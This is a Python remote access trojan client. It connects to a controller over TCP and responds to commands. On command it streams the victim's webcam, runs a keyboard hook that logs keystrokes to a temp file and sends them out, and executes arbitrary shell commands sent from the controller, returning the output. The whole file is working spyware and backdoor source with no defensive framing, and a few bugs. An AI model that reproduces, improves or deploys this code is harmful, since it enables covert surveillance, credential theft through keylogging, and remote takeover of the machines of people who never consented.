import socket 
import threading
import socket, cv2
import numpy
import struct
import pickle
import pythoncom
import pyHook
import tempfile
import subprocess

PORT = 8080
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)

FILE_NAME = tempfile.mkdtemp()+"\key_log.txt"
obj = pyHook.HookManager()

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def recWebCam(SERVER):
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW) #Capture from webcam
    while True:
        ret, frame = cap.read()
        data = pickle.dumps(frame)
        message_size = struct.pack("L", len(data))
        client.sendall(message_size + data)

        # client.close()

def keypressed(event):
    global data

    if event.Ascii == 13:
            keys = '\n'
            fp = open(FILE_NAME,'a+')
            data = keys            
            fp.write(data)
            fp.close()
    elif event.Ascii == 8:
            keys = ' <BS> '
            fp = open(FILE_NAME,'a+')
            data = keys            
            fp.write(data)
            fp.close()
    elif event.Ascii == 9:
            keys = ' \t '
            fp = open(FILE_NAME,'a+')
            data = keys
            fp.write(data)
            fp.close()
    elif event.Ascii == 27:
            keys = ' <ESC> '
            fp = open(FILE_NAME,'a+')
            data = keys
            fp.write(data + "\n")
            fp.close()
    elif event.Ascii == 1 or event.Ascii == 3 or event.Ascii == 19 or event.Ascii == 0 or event.Ascii == 24:
            pass
    else:
            keys = chr(event.Ascii)
            fp = open(FILE_NAME,'a+')
            data = keys
            fp.write(data)
            fp.close()
    return 0

def transfer(s):
    f = open(FILE_NAME, 'rb')
    packet = f.read(1024*1024)#1MB
    while packet != '':
        client.send(packet) 
        packet = f.read(1024*1024)
    f.close()
    client.send(b'DONE')

def startKeyLogger():
    obj.KeyDown = keypressed
    obj.HookKeyboard()
    pythoncom.PumpMessages()
    
def stopKeyLogger():
    obj.UnhookKeyboard()
    transfer(SERVER)

def get_shell(s):
    while True:

        command = client.recv(1024*1024).decode()
        if command == "close":
            break
        # cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = subprocess.getoutput(command)
        if output == "":
            client.send(b"[no results]")
        
        client.send(output.encode())
        # client.send(cmd.stderr.read())
    
print(f"[CLIENT CONNECTED] -- {SERVER}, {type(SERVER)}")

def client_func():
    
    while True:
        # addr = SERVER
        command = client.recv(1024*1024).decode()
        if 'open_webcam' in command:
            thread = threading.Thread(target=recWebCam, args=(SERVER,))
            thread.start()
        elif 'logger_start' in command:
            thread = threading.Thread(target=startKeyLogger)
            thread.start()
        elif 'logger_end' in command:
            stopKeyLogger()
        elif 'get_shell' in command:
            get_shell(SERVER)

client_func()